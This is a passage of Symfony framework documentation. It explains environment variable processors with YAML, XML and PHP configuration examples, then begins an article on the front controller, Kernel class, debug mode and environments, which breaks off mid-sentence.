    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                safe_for_production: '%env(not:APP_DEBUG)%'

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="safe_for_production">%env(not:APP_DEBUG)%</parameter>
                </parameters>

            </container>

        .. code-block:: php

            // config/services.php
            $container->setParameter('safe_for_production', '%env(not:APP_DEBUG)%');

``env(int:FOO)``
    Casts ``FOO`` to an int.

``env(float:FOO)``
    Casts ``FOO`` to a float.

``env(const:FOO)``
    Finds the const value named in ``FOO``:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/security.yaml
            parameters:
                env(HEALTH_CHECK_METHOD): 'Symfony\Component\HttpFoundation\Request::METHOD_HEAD'
            security:
                access_control:
                    - { path: '^/health-check$', methods: '%env(const:HEALTH_CHECK_METHOD)%' }

        .. code-block:: xml

            <!-- config/packages/security.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:security="http://symfony.com/schema/dic/security"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/security
                    https://symfony.com/schema/dic/security/security-1.0.xsd">

                <parameters>
                    <parameter key="env(HEALTH_CHECK_METHOD)">Symfony\Component\HttpFoundation\Request::METHOD_HEAD</parameter>
                </parameters>

                <security:config>
                    <rule path="^/health-check$" methods="%env(const:HEALTH_CHECK_METHOD)%"/>
                </security:config>
            </container>

        .. code-block:: php

            // config/packages/security.php
            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\SecurityConfig;

            return static function (ContainerBuilder $container, SecurityConfig $security): void {
                $container->setParameter('env(HEALTH_CHECK_METHOD)', 'Symfony\Component\HttpFoundation\Request::METHOD_HEAD');
                $security->accessControl()
                    ->path('^/health-check$')
                    ->methods([env('HEALTH_CHECK_METHOD')->const()]);
            };

``env(base64:FOO)``
    Decodes the content of ``FOO``, which is a base64 encoded string.

``env(json:FOO)``
    Decodes the content of ``FOO``, which is a JSON encoded string. It returns
    either an array or ``null``:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(ALLOWED_LANGUAGES): '["en","de","es"]'
                app_allowed_languages: '%env(json:ALLOWED_LANGUAGES)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(ALLOWED_LANGUAGES)">["en","de","es"]</parameter>
                    <parameter key="app_allowed_languages">%env(json:ALLOWED_LANGUAGES)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\FrameworkConfig;

            return static function (ContainerBuilder $container): void {
                $container->setParameter('env(ALLOWED_LANGUAGES)', '["en","de","es"]');
                $container->setParameter('app_allowed_languages', '%env(json:ALLOWED_LANGUAGES)%');
            };

``env(resolve:FOO)``
    If the content of ``FOO`` includes container parameters (with the syntax
    ``%parameter_name%``), it replaces the parameters by their values:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/sentry.yaml
            parameters:
                sentry_host: '10.0.0.1'
                env(SENTRY_DSN): 'http://%sentry_host%/project'
            sentry:
                dsn: '%env(resolve:SENTRY_DSN)%'

        .. code-block:: xml

            <!-- config/packages/sentry.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <parameters>
                    <parameter key="sentry_host">10.0.0.1</parameter>
                    <parameter key="env(SENTRY_DSN)">http://%sentry_host%/project</parameter>
                </parameters>

                <sentry:config dsn="%env(resolve:SENTRY_DSN)%"/>
            </container>

        .. code-block:: php

            // config/packages/sentry.php
            $container->setParameter('sentry_host', '10.0.0.1');
            $container->setParameter('env(SENTRY_DSN)', 'http://%sentry_host%/project');
            $container->loadFromExtension('sentry', [
                'dsn' => '%env(resolve:SENTRY_DSN)%',
            ]);

``env(csv:FOO)``
    Decodes the content of ``FOO``, which is a CSV-encoded string:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(ALLOWED_LANGUAGES): "en,de,es"
                app_allowed_languages: '%env(csv:ALLOWED_LANGUAGES)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(ALLOWED_LANGUAGES)">en,de,es</parameter>
                    <parameter key="app_allowed_languages">%env(csv:ALLOWED_LANGUAGES)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\FrameworkConfig;

            return static function (ContainerBuilder $container): void {
                $container->setParameter('env(ALLOWED_LANGUAGES)', 'en,de,es');
                $container->setParameter('app_allowed_languages', '%env(csv:ALLOWED_LANGUAGES)%');
            };

``env(shuffle:FOO)``
    Randomly shuffles values of the ``FOO`` env var, which must be an array.

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(REDIS_NODES): "127.0.0.1:6380,127.0.0.1:6381"
            services:
                RedisCluster:
                    class: RedisCluster
                    arguments: [null, "%env(shuffle:csv:REDIS_NODES)%"]

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(REDIS_NODES)">redis://127.0.0.1:6380,redis://127.0.0.1:6381</parameter>
                </parameters>

                <services>
                    <service id="RedisCluster" class="RedisCluster">
                        <argument>null</argument>
                        <argument>%env(shuffle:csv:REDIS_NODES)%</argument>
                    </service>
                </services>
            </container>

        .. code-block:: php

            // config/services.php
            use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;

            return static function (ContainerConfigurator $containerConfigurator): void {
                $container = $containerConfigurator->services()
                    ->set(\RedisCluster::class, \RedisCluster::class)->args([null, '%env(shuffle:csv:REDIS_NODES)%']);
            };

``env(file:FOO)``
    Returns the contents of a file whose path is the value of the ``FOO`` env var:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(AUTH_FILE): '%kernel.project_dir%/config/auth.json'
            google:
                auth: '%env(file:AUTH_FILE)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(AUTH_FILE)">../config/auth.json</parameter>
                </parameters>

                <google auth="%env(file:AUTH_FILE)%"/>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            $container->setParameter('env(AUTH_FILE)', '../config/auth.json');
            $container->loadFromExtension('google', [
                'auth' => '%env(file:AUTH_FILE)%',
            ]);

``env(require:FOO)``
    ``require()`` the PHP file whose path is the value of the ``FOO``
    env var and return the value returned from it.

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(PHP_FILE): '%kernel.project_dir%/config/.runtime-evaluated.php'
            app:
                auth: '%env(require:PHP_FILE)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(PHP_FILE)">../config/.runtime-evaluated.php</parameter>
                </parameters>

                <app auth="%env(require:PHP_FILE)%"/>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            $container->setParameter('env(PHP_FILE)', '../config/.runtime-evaluated.php');
            $container->loadFromExtension('app', [
                'auth' => '%env(require:PHP_FILE)%',
            ]);

``env(trim:FOO)``
    Trims the content of ``FOO`` env var, removing whitespaces from the beginning
    and end of the string. This is especially useful in combination with the
    ``file`` processor, as it'll remove newlines at the end of a file.

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(AUTH_FILE): '%kernel.project_dir%/config/auth.json'
            google:
                auth: '%env(trim:file:AUTH_FILE)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(AUTH_FILE)">../config/auth.json</parameter>
                </parameters>

                <google auth="%env(trim:file:AUTH_FILE)%"/>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            $container->setParameter('env(AUTH_FILE)', '../config/auth.json');
            $container->loadFromExtension('google', [
                'auth' => '%env(trim:file:AUTH_FILE)%',
            ]);

``env(key:FOO:BAR)``
    Retrieves the value associated with the key ``FOO`` from the array whose
    contents are stored in the ``BAR`` env var:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                env(SECRETS_FILE): '/opt/application/.secrets.json'
                database_password: '%env(key:database_password:json:file:SECRETS_FILE)%'
                # if SECRETS_FILE contents are: {"database_password": "secret"} it returns "secret"

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(SECRETS_FILE)">/opt/application/.secrets.json</parameter>
                    <parameter key="database_password">%env(key:database_password:json:file:SECRETS_FILE)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/services.php
            $container->setParameter('env(SECRETS_FILE)', '/opt/application/.secrets.json');
            $container->setParameter('database_password', '%env(key:database_password:json:file:SECRETS_FILE)%');

``env(default:fallback_param:BAR)``
    Retrieves the value of the parameter ``fallback_param`` when the ``BAR`` env
    var is not available:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                # if PRIVATE_KEY is not a valid file path, the content of raw_key is returned
                private_key: '%env(default:raw_key:file:PRIVATE_KEY)%'
                raw_key: '%env(PRIVATE_KEY)%'

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">
                <parameters>
                    <!-- if PRIVATE_KEY is not a valid file path, the content of raw_key is returned -->
                    <parameter key="private_key">%env(default:raw_key:file:PRIVATE_KEY)%</parameter>
                    <parameter key="raw_key">%env(PRIVATE_KEY)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/services.php

            // if PRIVATE_KEY is not a valid file path, the content of raw_key is returned
            $container->setParameter('private_key', '%env(default:raw_key:file:PRIVATE_KEY)%');
            $container->setParameter('raw_key', '%env(PRIVATE_KEY)%');

    When the fallback parameter is omitted (e.g. ``env(default::API_KEY)``), then the
    returned value is ``null``.

``env(url:FOO)``
    Parses an absolute URL and returns its components as an associative array.

    .. code-block:: bash

        # .env
        MONGODB_URL="mongodb://db_user:db_password@127.0.0.1:27017/db_name"

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/mongodb.yaml
            mongo_db_bundle:
                clients:
                    default:
                        hosts:
                            - { host: '%env(string:key:host:url:MONGODB_URL)%', port: '%env(int:key:port:url:MONGODB_URL)%' }
                        username: '%env(string:key:user:url:MONGODB_URL)%'
                        password: '%env(string:key:pass:url:MONGODB_URL)%'
                connections:
                    default:
                        database_name: '%env(key:path:url:MONGODB_URL)%'

        .. code-block:: xml

            <!-- config/packages/mongodb.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <mongodb:config>
                    <mongodb:client name="default" username="%env(string:key:user:url:MONGODB_URL)%" password="%env(string:key:pass:url:MONGODB_URL)%">
                        <mongodb:host host="%env(string:key:host:url:MONGODB_URL)%" port="%env(int:key:port:url:MONGODB_URL)%"/>
                    </mongodb:client>
                    <mongodb:connections name="default" database_name="%env(key:path:url:MONGODB_URL)%"/>
                </mongodb:config>
            </container>

        .. code-block:: php

            // config/packages/mongodb.php
            $container->loadFromExtension('mongodb', [
                'clients' => [
                    'default' => [
                        'hosts' => [
                            [
                                'host' => '%env(string:key:host:url:MONGODB_URL)%',
                                'port' => '%env(int:key:port:url:MONGODB_URL)%',
                            ],
                        ],
                        'username' => '%env(string:key:user:url:MONGODB_URL)%',
                        'password' => '%env(string:key:pass:url:MONGODB_URL)%',
                    ],
                ],
                'connections' => [
                    'default' => [
                        'database_name' => '%env(key:path:url:MONGODB_URL)%',
                    ],
                ],
            ]);

    .. caution::

        In order to ease extraction of the resource from the URL, the leading
        ``/`` is trimmed from the ``path`` component.

``env(query_string:FOO)``
    Parses the query string part of the given URL and returns its components as
    an associative array.

    .. code-block:: bash

        # .env
        MONGODB_URL="mongodb://db_user:db_password@127.0.0.1:27017/db_name?timeout=3000"

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/mongodb.yaml
            mongo_db_bundle:
                clients:
                    default:
                        # ...
                        connectTimeoutMS: '%env(int:key:timeout:query_string:MONGODB_URL)%'

        .. code-block:: xml

            <!-- config/packages/mongodb.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <mongodb:config>
                    <mongodb:client name="default" connectTimeoutMS="%env(int:key:timeout:query_string:MONGODB_URL)%"/>
                </mongodb:config>
            </container>

        .. code-block:: php

            // config/packages/mongodb.php
            $container->loadFromExtension('mongodb', [
                'clients' => [
                    'default' => [
                        // ...
                        'connectTimeoutMS' => '%env(int:key:timeout:query_string:MONGODB_URL)%',
                    ],
                ],
            ]);

``env(enum:FooEnum:BAR)``
    Tries to convert an environment variable to an actual ``\BackedEnum`` value.
    This processor takes the fully qualified name of the ``\BackedEnum`` as an argument::

        // App\Enum\Suit.php
        enum Suit: string
        {
            case Clubs = 'clubs';
            case Spades = 'spades';
            case Diamonds = 'diamonds';
            case Hearts = 'hearts';
        }

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                suit: '%env(enum:App\Enum\Suit:CARD_SUIT)%'

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="suit">%env(enum:App\Enum\Suit:CARD_SUIT)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/services.php
            $container->setParameter('suit', '%env(enum:App\Enum\Suit:CARD_SUIT)%');

    The value stored in the ``CARD_SUIT`` env var would be a string (e.g. ``'spades'``)
    but the application will use the enum value (e.g. ``Suit::Spades``).

``env(defined:NO_FOO)``
    Evaluates to ``true`` if the env var exists and its value is not ``''``
    (an empty string) or ``null``; it returns ``false`` otherwise.

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                typed_env: '%env(defined:FOO)%'

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="typed_env"'%env(defined:FOO)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/services.php
            $container->setParameter('typed_env', '%env(defined:FOO)%');

.. _urlencode_environment_variable_processor:

``env(urlencode:FOO)``
    Encodes the content of the ``FOO`` env var using the :phpfunction:`urlencode`
    PHP function. This is especially useful when ``FOO`` value is not compatible
    with DSN syntax.

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/framework.yaml
            parameters:
                env(DATABASE_URL): 'mysql://db_user:foo@b$r@127.0.0.1:3306/db_name'
                encoded_database_url: '%env(urlencode:DATABASE_URL)%'

        .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <parameters>
                    <parameter key="env(DATABASE_URL)">mysql://db_user:foo@b$r@127.0.0.1:3306/db_name</parameter>
                    <parameter key="encoded_database_url">%env(urlencode:DATABASE_URL)%</parameter>
                </parameters>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use Symfony\Component\DependencyInjection\ContainerBuilder;
            use Symfony\Config\FrameworkConfig;

            return static function (ContainerBuilder $container): void {
                $container->setParameter('env(DATABASE_URL)', 'mysql://db_user:foo@b$r@127.0.0.1:3306/db_name');
                $container->setParameter('encoded_database_url', '%env(urlencode:DATABASE_URL)%');
            };

    .. versionadded:: 7.1

        The ``env(urlencode:...)`` env var processor was introduced in Symfony 7.1.

It is also possible to combine any number of processors:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        parameters:
            env(AUTH_FILE): "%kernel.project_dir%/config/auth.json"
        google:
            # 1. gets the value of the AUTH_FILE env var
            # 2. replaces the values of any config param to get the config path
            # 3. gets the content of the file stored in that path
            # 4. JSON-decodes the content of the file and returns it
            auth: '%env(json:file:resolve:AUTH_FILE)%'

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <parameters>
                <parameter key="env(AUTH_FILE)">%kernel.project_dir%/config/auth.json</parameter>
            </parameters>

            <!-- 1. gets the value of the AUTH_FILE env var -->
            <!-- 2. replaces the values of any config param to get the config path -->
            <!-- 3. gets the content of the file stored in that path -->
            <!-- 4. JSON-decodes the content of the file and returns it -->
            <google auth="%env(json:file:resolve:AUTH_FILE)%"/>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        $container->setParameter('env(AUTH_FILE)', '%kernel.project_dir%/config/auth.json');
        // 1. gets the value of the AUTH_FILE env var
        // 2. replaces the values of any config param to get the config path
        // 3. gets the content of the file stored in that path
        // 4. JSON-decodes the content of the file and returns it
        $container->loadFromExtension('google', [
            'auth' => '%env(json:file:resolve:AUTH_FILE)%',
        ]);

Custom Environment Variable Processors
--------------------------------------

It's also possible to add your own processors for environment variables. First,
create a class that implements
:class:`Symfony\\Component\\DependencyInjection\\EnvVarProcessorInterface`::

    use Symfony\Component\DependencyInjection\EnvVarProcessorInterface;

    class LowercasingEnvVarProcessor implements EnvVarProcessorInterface
    {
        public function getEnv(string $prefix, string $name, \Closure $getEnv): string
        {
            $env = $getEnv($name);

            return strtolower($env);
        }

        public static function getProvidedTypes(): array
        {
            return [
                'lowercase' => 'string',
            ];
        }
    }

To enable the new processor in the app, register it as a service and
:doc:`tag it </service_container/tags>` with the ``container.env_var_processor``
tag. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
this is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.
Understanding how the Front Controller, Kernel and Environments Work together
=============================================================================

The :ref:`configuration environments <configuration-environments>` section
explained the basics on how Symfony uses environments to run your application
with different configuration settings. This section will explain a bit more
in-depth what happens when your application is bootstrapped. To hook into this
process, you need to understand three parts that work together:

* `The Front Controller`_
* `The Kernel Class`_
* `The Environments`_

.. note::

    Usually, you will not need to define your own front controller or
    ``Kernel`` class as Symfony provides sensible default implementations.
    This article is provided to explain what is going on behind the scenes.

.. _architecture-front-controller:

The Front Controller
--------------------

The `front controller`_ is a design pattern; it is a section of code that *all*
requests served by an application run through.

In the Symfony Skeleton, this role is taken by the ``index.php`` file in the
``public/`` directory. This is the very first PHP script that is run when a
request is processed.

The main purpose of the front controller is to create an instance of the
``Kernel`` (more on that in a second), make it handle the request and return
the resulting response to the browser.

Because every request is routed through it, the front controller can be
used to perform global initialization prior to setting up the kernel or
to `decorate`_ the kernel with additional features. Examples include:

* Configuring the autoloader or adding additional autoloading mechanisms;
* Adding HTTP level caching by wrapping the kernel with an instance of
  :ref:`HttpCache <symfony-gateway-cache>`;
* Enabling the `Debug component`_.

You can choose the front controller that's used by adding it in the URL, like:

.. code-block:: text

     http://localhost/index.php/some/path/...

As you can see, this URL contains the PHP script to be used as the front
controller. You can use that to switch to a custom made front controller
that is located in the ``public/`` directory.

.. seealso::

    You almost never want to show the front controller in the URL. This is
    achieved by configuring the web server, as shown in
    :doc:`/setup/web_server_configuration`.

Technically, the ``bin/console`` script used when running Symfony on the command
line is also a front controller, only that is not used for web, but for command
line requests.

The Kernel Class
----------------

The :class:`Symfony\\Component\\HttpKernel\\Kernel` is the core of
Symfony. It is responsible for setting up all the bundles used by
your application and providing them with the application's configuration.
It then creates the service container before serving requests in its
:method:`Symfony\\Component\\HttpKernel\\HttpKernelInterface::handle`
method.

The kernel used in Symfony applications extends from :class:`Symfony\\Component\\HttpKernel\\Kernel`
and uses the :class:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait`.
The ``Kernel`` class leaves some methods from :class:`Symfony\\Component\\HttpKernel\\KernelInterface`
unimplemented and the ``MicroKernelTrait`` defines several abstract methods, so
you must implement them all:

:method:`Symfony\\Component\\HttpKernel\\KernelInterface::registerBundles`
    It must return an array of all bundles needed to run the application.

:method:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait::configureRoutes`
    It adds individual routes or collections of routes to the application (for
    example loading the routes defined in some config file).

:method:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait::configureContainer`
    It loads the application configuration from config files or using the
    ``loadFromExtension()`` method and can also register new container parameters
    and services.

To fill these (small) blanks, your application needs to extend the Kernel class
and use the MicroKernelTrait to implement these methods. Symfony provides by
default that kernel in the ``src/Kernel.php`` file.

This class uses the name of the environment - which is passed to the Kernel's
:method:`constructor <Symfony\\Component\\HttpKernel\\Kernel::__construct>`
method and is available via :method:`Symfony\\Component\\HttpKernel\\Kernel::getEnvironment` -
to decide which bundles to enable. The logic for that is in ``registerBundles()``.

You are free to create your own, alternative or additional ``Kernel`` variants.
All you need is to adapt your (or add a new) front controller to make use of the
new kernel.

.. note::

    The name and location of the ``Kernel`` is not fixed. When putting
    :doc:`multiple kernels into a single application </configuration/multiple_kernels>`,
    it might therefore make sense to add additional sub-directories, for example
    ``src/admin/AdminKernel.php`` and ``src/api/ApiKernel.php``. All that matters
    is that your front controller is able to create an instance of the appropriate kernel.

.. note::

    There's a lot more the ``Kernel`` can be used for, for example
    :doc:`overriding the default directory structure </configuration/override_dir_structure>`.
    But odds are high that you don't need to change things like this on the
    fly by having several ``Kernel`` implementations.

.. _debug-mode:

Debug Mode
~~~~~~~~~~

The second argument to the ``Kernel`` constructor specifies if the application
should run in "debug mode". Regardless of the
:ref:`configuration environment <configuration-environments>`, a Symfony
application can be run with debug mode set to ``true`` or ``false``.

This affects many things in the application, such as displaying stack traces on
error pages or if cache files are dynamically rebuilt on each request. Though
not a requirement, debug mode is generally set to ``true`` for the ``dev`` and
``test`` environments and ``false`` for the ``prod`` environment.

Similar to :ref:`configuring the environment <selecting-the-active-environment>`
you can also enable/disable the debug mode using :ref:`the .env file <config-dot-env>`:

.. code-block:: bash

    # .env
    # set it to 1 to enable the debug mode
    APP_DEBUG=0

This value can be overridden for commands by passing the ``APP_DEBUG`` value
before running them:

.. code-block:: terminal

    # Use the debug mode defined in the .env file
    $ php bin/console command_name

    # Ignore the .env file and enable the debug mode for this command
    $ APP_DEBUG=1 php bin/console command_name

Internally, the value of the debug mode becomes the ``kernel.debug``
parameter used inside the :doc:`service container </service_container>`.
If you look inside the application configuration file, you'll see the
parameter used, for example, to turn Twig's debug mode on:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            debug: '%kernel.debug%'

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config debug="%kernel.debug%"/>

        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...
            $twig->debug('%kernel.debug%');
        };

The Environments
----------------

As mentioned above, the ``Kernel`` has to implement another method -
:method:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait::configureContainer`.
This method is responsible for loading the application's configuration from the
right *environment*.

:ref:`Configuration environments <configuration-environments>` allow to execute
the same code using different configuration. Symfony provides three environments
by default called ``dev``, ``prod`` and ``test``.

More technically, these names are nothing more than strings passed from the
front controller to the ``Kernel``'s constructor. This name can then be used in
the ``configureContainer()`` method to decide which configuration files to load.

Symfony's default ``Kernel`` class implements this method by loading first the
config files found on ``config/packages/*`` and then, the files found on
